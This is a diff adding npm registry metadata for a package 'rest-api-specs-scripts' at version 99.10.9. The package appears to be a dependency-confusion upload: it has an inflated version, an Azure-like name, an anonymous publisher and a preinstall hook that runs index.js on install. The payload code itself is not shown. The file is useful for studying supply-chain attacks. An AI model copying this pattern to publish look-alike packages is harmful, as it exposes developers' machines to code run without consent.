@@ -1,0 +1,62 @@
+{
+    "_id": "rest-api-specs-scripts",
+    "name": "rest-api-specs-scripts",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "rest-api-specs-scripts",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "rest-api-specs-scripts@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-SG0HYVkEHK++MaIMVcywnrGpaiU0SaykdOZrk3Tt+IwRZoaXDIn+Q8Il+jSppsw7+G54UP5NvBCu38nsHki+Bg==",
+                "shasum": "440201c4d1f89e5d43f7483440885a2305f045d9",
+                "tarball": "https://registry.npmjs.org/rest-api-specs-scripts/-/rest-api-specs-scripts-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5074,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO7c/ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpSow/5APyja75E+9IWNzTrLnzm/pTZ1QOMrssJmUl3olnji/VMIQfj\r\niNSR8cKLDtS4xmD5Pa1nm3hhblF8CqyaWeqMAD3pNaLmTOfuiRjol/zmVYDV\r\nAIHYUu5WjT7W9hWJJ3QQL8c4DNpnnNmp3nHSoJm26UJsgwRaYvFPtWXsUe7A\r\nOQjVkwWDr97MYvsFH9rJXULUJlSf+6vaSUpxK5WfZi9HV8+i1ByIcd2E+/DI\r\nKeCwNU1Pf/tAmsZygBevszdnbcJHWBE8IlDW35LdZDLArDDLSAvb9wqNL2uV\r\nJPmcjNbWiJnCYFvxgU7KwdZDjJmkgrHkaW6GwzwLcZ7qXWtYVvd1/F58WjXN\r\n5XWjaMMQQjs+o2Sj0sNueOQ7ZLTN7MNLRvVtPUrlY4PEYvaJyzahWMzcNn8r\r\nExCao89Y98fE2YM2fnkZyVYzHDlHdMBXSCCfYvLTPUScFYoZ3ToXhgDI3SQd\r\nk6KvAlVLHI+Pmn2xjB9gw61LoPM5VKBY8q7Ne9mwv3pKC9s4YW/UtpZTirgw\r\nIiG4IDaCAR7nYx+up9+oZXN1VIff+E2DB1/6Xn8vorcntpnKa9Zyjf24ytnn\r\nGwH/dHz63Lm6Lyi7rfUktVGNI++LEXIGw192p9BKPzwvF/hTXTGynxeS9HKi\r\n42D92jNOkF2SNAmB/hW0TRWcn2Sb1/MyIFw=\r\n=7ELH\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "mbtggbzl",
+                "email": "mbtggbzl@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "mbtggbzl",
+                    "email": "mbtggbzl@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/rest-api-specs-scripts_99.10.9_1648080703255_0.42293953053850375"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T00:11:43.255Z",
+        "99.10.9": "2022-03-24T00:11:43.407Z",
+        "modified": "2022-03-24T00:11:43.531Z"
+    },
+    "maintainers": [
+        {
+            "name": "mbtggbzl",
+            "email": "mbtggbzl@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
